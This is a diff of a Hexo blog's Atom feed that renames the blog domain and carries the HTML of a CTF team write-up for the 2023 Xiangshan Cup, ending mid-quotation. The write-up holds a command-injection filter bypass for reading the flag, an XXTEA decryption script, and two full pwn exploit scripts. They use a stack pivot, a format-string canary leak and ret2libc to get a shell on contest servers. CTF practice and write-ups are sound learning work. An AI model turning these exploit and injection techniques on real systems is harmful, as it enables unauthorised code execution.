@@ -3,11 +3,11 @@
   <title>lmarch2&#39;blog</title>
   
   <subtitle>求知若渴，虚心若愚</subtitle>
-  <link href="http://lmarch2.github.io/atom.xml" rel="self"/>
+  <link href="http://lmarch2.top/atom.xml" rel="self"/>
   
-  <link href="http://lmarch2.github.io/"/>
-  <updated>2024-02-06T08:37:33.916Z</updated>
-  <id>http://lmarch2.github.io/</id>
+  <link href="http://lmarch2.top/"/>
+  <updated>2024-02-08T11:46:17.028Z</updated>
+  <id>http://lmarch2.top/</id>
   
   <author>
     <name>lmarch2</name>
@@ -17,9 +17,35 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Excalibur维护日记</title>
+    <link href="http://lmarch2.top/posts/8c945bd4/"/>
+    <id>http://lmarch2.top/posts/8c945bd4/</id>
+    <published>2024-02-07T17:52:54.000Z</published>
+    <updated>2024-02-08T11:46:17.028Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>之前看一些大神都有自己写的pwn题写exp用的python库，想着自己也写一个自用，方便exp的编写</p><p>虽然不是什么好东西，也只有几行简单的代码，但本着开源分享的原则，今天研究了一下传到pypi上了</p><p>23年暑假写的时候正在狂刷fate，然后直接粉上吾王，于是给库其名为Excalibur。至于为什么有个2 ，传的时候发现重名了……</p><p>此博客记录一下这个库的上传和维护过程。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
+      
+    
+    
+    
+    <category term="tools and tricks" scheme="http://lmarch2.top/categories/tools-and-tricks/"/>
+    
+    
+    <category term="pwn" scheme="http://lmarch2.top/tags/pwn/"/>
+    
+    <category term="package" scheme="http://lmarch2.top/tags/package/"/>
+    
+  </entry>
+  
+  <entry>
     <title>2023古剑山pwn题wp</title>
-    <link href="http://lmarch2.github.io/posts/7d54edc7/"/>
-    <id>http://lmarch2.github.io/posts/7d54edc7/</id>
+    <link href="http://lmarch2.top/posts/7d54edc7/"/>
+    <id>http://lmarch2.top/posts/7d54edc7/</id>
     <published>2024-02-06T08:32:53.000Z</published>
     <updated>2024-02-06T08:37:33.916Z</updated>
     
@@ -33,19 +59,19 @@
     
     
     
-    <category term="wp" scheme="http://lmarch2.github.io/categories/wp/"/>
+    <category term="wp" scheme="http://lmarch2.top/categories/wp/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="杯子" scheme="http://lmarch2.github.io/tags/%E6%9D%AF%E5%AD%90/"/>
+    <category term="杯子" scheme="http://lmarch2.top/tags/%E6%9D%AF%E5%AD%90/"/>
     
   </entry>
   
   <entry>
     <title>HASHTEAM2023强网杯wp</title>
-    <link href="http://lmarch2.github.io/posts/19b7e153/"/>
-    <id>http://lmarch2.github.io/posts/19b7e153/</id>
+    <link href="http://lmarch2.top/posts/19b7e153/"/>
+    <id>http://lmarch2.top/posts/19b7e153/</id>
     <published>2024-01-29T16:47:18.000Z</published>
     <updated>2024-02-05T14:16:31.130Z</updated>
     
@@ -59,19 +85,19 @@
     
     
     
-    <category term="HASHTEAM&#39;wp" scheme="http://lmarch2.github.io/categories/HASHTEAM-wp/"/>
+    <category term="HASHTEAM&#39;wp" scheme="http://lmarch2.top/categories/HASHTEAM-wp/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="杯子" scheme="http://lmarch2.github.io/tags/%E6%9D%AF%E5%AD%90/"/>
+    <category term="杯子" scheme="http://lmarch2.top/tags/%E6%9D%AF%E5%AD%90/"/>
     
   </entry>
   
   <entry>
     <title>HASHTEAM2023N1ctfWP</title>
-    <link href="http://lmarch2.github.io/posts/d8c86fdf/"/>
-    <id>http://lmarch2.github.io/posts/d8c86fdf/</id>
+    <link href="http://lmarch2.top/posts/d8c86fdf/"/>
+    <id>http://lmarch2.top/posts/d8c86fdf/</id>
     <published>2024-01-29T15:47:41.000Z</published>
     <updated>2024-02-05T14:06:06.125Z</updated>
     
@@ -85,21 +111,21 @@
     
     
     
-    <category term="HASHTEAM&#39;wp" scheme="http://lmarch2.github.io/categories/HASHTEAM-wp/"/>
+    <category term="HASHTEAM&#39;wp" scheme="http://lmarch2.top/categories/HASHTEAM-wp/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="N1CTF" scheme="http://lmarch2.github.io/tags/N1CTF/"/>
+    <category term="N1CTF" scheme="http://lmarch2.top/tags/N1CTF/"/>
     
   </entry>
   
   <entry>
-    <title>HASHTEAM2024香山杯WP</title>
-    <link href="http://lmarch2.github.io/posts/2611e12a/"/>
-    <id>http://lmarch2.github.io/posts/2611e12a/</id>
+    <title>HASHTEAM2023香山杯WP</title>
+    <link href="http://lmarch2.top/posts/2611e12a/"/>
+    <id>http://lmarch2.top/posts/2611e12a/</id>
     <published>2023-10-27T13:00:57.000Z</published>
-    <updated>2024-02-05T14:20:41.359Z</updated>
+    <updated>2024-02-08T11:46:25.171Z</updated>
     
     <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本wp是队友们共同努力的结果，感谢.N1nEmAn、HeyGap、1cfh、shui、hash_hash等师傅。</p><h1 id="HASHTEAM香山杯WP"><a href="#HASHTEAM香山杯WP" class="headerlink" title="HASHTEAM香山杯WP"></a>HASHTEAM香山杯WP</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>将题目所给编码丢入赛博大厨，得到类似凯撒密码的字符串。</p><p><img src="https://s2.loli.net/2023/10/15/CcQBj3qFVfG4por.png" alt="image-20231015173916142.png"></p><p>因为flag格式第一个是f，则可以确定凯撒的偏移，得到flag。</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="PHP-unserialize-pro"><a href="#PHP-unserialize-pro" class="headerlink" title="PHP_unserialize_pro"></a>PHP_unserialize_pro</h3><p>查看源码，很显然就是一个反序列化利用。</p><p><img src="https://s2.loli.net/2023/10/15/5mISwDTexlO9PpL.png"></p><p>但是过滤了f l a g * ?，需要绕过。这里首先使用<code>dir -1 /</code>查看flag位置，发现是在第五个。<br><img src="https://s2.loli.net/2023/10/16/QK4y5GvgnJfXl8h.png"><br>然后使用<code>rev /$(dir -l / | sed -n 5p)</code>读取flag。<br><img src="https://s2.loli.net/2023/10/16/WgVm8jUzdBN6fGO.png"><br>得到一个反向flag。</p><p>再次反向得到flag。</p><blockquote><p> ~/ctf/match/xsb2023/web » rev flag                                                      </p><p> flag{8bab51a8-191e-4e78-8ca4-f1fc3fb6c018}</p></blockquote><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="URL从哪儿来"><a href="#URL从哪儿来" class="headerlink" title="URL从哪儿来"></a>URL从哪儿来</h3><p>运行题目所给的附件，设置断点在”ou.exe”所在处。在相应文件夹找到ou.exe的相关文件，然后拖入ida。<img src="https://s2.loli.net/2023/10/15/okIht1KHN2BYnJG.png"></p><p>运行ou.exe文件，发现在v18 += strlen(v18)处下断点，搜索flag可以得到flag。<img src="https://s2.loli.net/2023/10/15/EN1HQ9wIjrxizyL.png"></p><h3 id="hello-python"><a href="#hello-python" class="headerlink" title="hello python"></a>hello python</h3><p>了解到是python写的apk，定位所有与组件无关的后发现app.imy文件(用zip可以打开)，打开是个xxtea，直接解密即可。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">shift</span><span class="token punctuation">(</span>z<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> k<span class="token punctuation">,</span> p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>z <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>    delta <span class="token operator">=</span> <span class="token number">0x9E3779B9</span>    n <span class="token operator">=</span> len<span class="token punctuation">(</span>v<span class="token punctuation">)</span>    rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">//</span> n    x <span class="token operator">=</span> <span class="token number">0</span>    z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>rounds<span class="token punctuation">)</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> delta<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>        e <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span>        <span class="token keyword">for</span> p <span class="token keyword">in</span> range<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            y <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>            v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+</span> shift<span class="token punctuation">(</span>z<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> k<span class="token punctuation">,</span> p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>            z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span>        p <span class="token operator">+=</span> <span class="token number">1</span>        y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> shift<span class="token punctuation">(</span>z<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> k<span class="token punctuation">,</span> p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>        z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> v<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>    delta <span class="token operator">=</span> <span class="token number">0x9E3779B9</span>    n <span class="token operator">=</span> len<span class="token punctuation">(</span>v<span class="token punctuation">)</span>    rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">//</span> n    x <span class="token operator">=</span> <span class="token punctuation">(</span>rounds <span class="token operator">*</span> delta<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>    y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>rounds<span class="token punctuation">)</span><span class="token punctuation">:</span>        e <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span>        <span class="token keyword">for</span> p <span class="token keyword">in</span> range<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            z <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>            v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-</span> shift<span class="token punctuation">(</span>z<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> k<span class="token punctuation">,</span> p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>            y <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span>        p <span class="token operator">-=</span> <span class="token number">1</span>        z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>        v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> shift<span class="token punctuation">(</span>z<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> k<span class="token punctuation">,</span> p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>        y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> delta<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>    <span class="token keyword">return</span> vc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">689085350</span> <span class="token punctuation">,</span><span class="token number">626885696</span> <span class="token punctuation">,</span><span class="token number">1894439255</span> <span class="token punctuation">,</span><span class="token number">1204672445</span> <span class="token punctuation">,</span><span class="token number">1869189675</span> <span class="token punctuation">,</span><span class="token number">475967424</span> <span class="token punctuation">,</span><span class="token number">1932042439</span> <span class="token punctuation">,</span><span class="token number">1280104741</span> <span class="token punctuation">,</span><span class="token number">2808893494</span> <span class="token punctuation">]</span>k <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">12345678</span> <span class="token punctuation">,</span><span class="token number">12398712</span> <span class="token punctuation">,</span><span class="token number">91283904</span> <span class="token punctuation">,</span><span class="token number">12378192</span> <span class="token punctuation">]</span>m <span class="token operator">=</span> <span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>c<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span></code></pre><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Move"><a href="#Move" class="headerlink" title="Move"></a>Move</h3><p>一道简单的栈迁移。第一次迁移到所给的skdd之后，泄露puts函数地址，接着返回到main，由于栈已经被迁移，返回地址被篡改，此时直接输入one_shot，即可返回到one_shot的地址上，从而getshell。具体的在注释。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> evilblade <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>setup<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#libset('libc-2.31.so')</span>rsetup<span class="token punctuation">(</span><span class="token string">'101.201.35.76'</span><span class="token punctuation">,</span><span class="token number">29720</span><span class="token punctuation">)</span>evgdb<span class="token punctuation">(</span><span class="token punctuation">)</span>rdi <span class="token operator">=</span> <span class="token number">0x401353</span>lv <span class="token operator">=</span> <span class="token number">0x000000000040124b</span>pay <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gotadd<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pltadd<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401264</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#泄露puts之后，返回到main</span>sd<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'ber'</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x12345678</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#符合判断，执行溢出</span>sd<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x405098</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>lv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#溢出进行栈迁移到skdd</span>addx <span class="token operator">=</span> getx64<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>base <span class="token operator">=</span> addx <span class="token operator">-</span> <span class="token number">0x80970</span>sys <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x4f420</span>binsh <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x1b3d88</span>os <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x4f302</span><span class="token comment" spellcheck="true">#输入oneshot，getshell</span>sl<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>os<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sd(p32(0x12345678))</span><span class="token comment" spellcheck="true">#sd(b'a'*0x30+p64(0x405098)+p64(lv))</span>ia<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''============================================================0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401350 : pop r14 ; pop r15 ; ret0x0000000000401352 : pop r15 ; ret0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret0x000000000040119d : pop rbp ; ret0x0000000000401353 : pop rdi ; ret0x0000000000401351 : pop rsi ; pop r15 ; ret0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040101a : ret'''</span></code></pre><h3 id="pwthon"><a href="#pwthon" class="headerlink" title="pwthon"></a>pwthon</h3><p>这道题目看起来很麻烦，实际上发现<code>app.cpython-37m-x86_64-linux-gnu.so </code>就是cpython，就是python文件编译的有cpython库和libc库的一道题。</p><p>手动测试，发现每次输入会返回一个一模一样 的东西，猜测有格式化字符串漏洞。结果发现真有，由此泄露canary。</p><p><img src="https://s2.loli.net/2023/10/15/TNGqlfdvkIcJwLR.png"></p><p>观察到so文件中有Give you ……字符串，此处即是刚才运行的函数，发现有栈溢出漏洞。</p><p><img src="https://s2.loli.net/2023/10/15/pXufcVrYDHGwyLd.png"></p><p>有了栈溢出和canary，那么直接打ret2libc即可。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> evilblade <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>setup<span class="token punctuation">(</span><span class="token string">'pwn'</span><span class="token punctuation">)</span>rsetup<span class="token punctuation">(</span><span class="token string">'39.106.48.123'</span><span class="token punctuation">,</span> <span class="token number">13099</span><span class="token punctuation">)</span>evgdb<span class="token punctuation">(</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> b<span class="token string">'0'</span><span class="token punctuation">)</span>addx <span class="token operator">=</span> getx<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>base <span class="token operator">=</span> addx <span class="token operator">-</span> <span class="token number">0x68b0</span>dpx<span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">,</span> base<span class="token punctuation">)</span>sl<span class="token punctuation">(</span>b<span class="token string">'aaaaaaaa'</span><span class="token operator">+</span>b<span class="token string">'%p-'</span><span class="token operator">*</span><span class="token number">38</span><span class="token punctuation">)</span>can <span class="token operator">=</span> getx<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>dpx<span class="token punctuation">(</span><span class="token string">'canary'</span><span class="token punctuation">,</span>can<span class="token punctuation">)</span>rdi <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x0000000000003f8f</span>flag <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x013B66</span>rsi <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x0000000000003cd9</span>puts <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x3710</span>read <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x3940</span>op <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x3ae0</span>bss <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x16a80</span>write <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x3760</span>ret <span class="token operator">=</span> base <span class="token operator">+</span><span class="token number">0x000000000000301a</span><span class="token comment" spellcheck="true">#pay=(b'aaaaaaaa'*0x20+p64(can)*3+p64(rdi)+p64(binsh)+p64(puts))</span>pay<span class="token operator">=</span><span class="token punctuation">(</span>b<span class="token string">'aaaaaaaa'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>can<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base<span class="token operator">+</span><span class="token number">0x016078</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base <span class="token operator">+</span> <span class="token number">0x99f0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>libc <span class="token operator">=</span> tet<span class="token punctuation">(</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> getx64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x80970</span>dpx<span class="token punctuation">(</span><span class="token string">'libcbase'</span><span class="token punctuation">,</span> libc<span class="token punctuation">)</span>sl<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token punctuation">)</span>pay<span class="token operator">=</span><span class="token punctuation">(</span>b<span class="token string">'aaaaaaaa'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>can<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc <span class="token operator">+</span> <span class="token number">0x1b3d88</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc <span class="token operator">+</span> <span class="token number">0x4f420</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbaef</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>ia<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>参考文章补充一下，实在不知道怎么调试。打灰盒好累hhh。</p><p><a href="https://www.cnblogs.com/ve1kcon/p/17766267.html">https://www.cnblogs.com/ve1kcon/p/17766267.html</a></p><pre class=" language-python"><code class="language-python">Pwthonpython pwn？实际上也是去跑 c 程序，不过还是第一次见。封装了一个 so 库，在 python 代码中会去调用这个库的函数，这样的话，相比起常规 pwn 题，就是会不好去调试。将库文件丢进 ida 分析，表面很复杂，有种做 vm 题的感觉（bushi实际上在第一个输入点输入<span class="token number">0</span>就能进入到 __pyx_f_3app_Welcome2Pwnthon 函数了，存在格式化字符串漏洞和栈溢出，而且直接给了 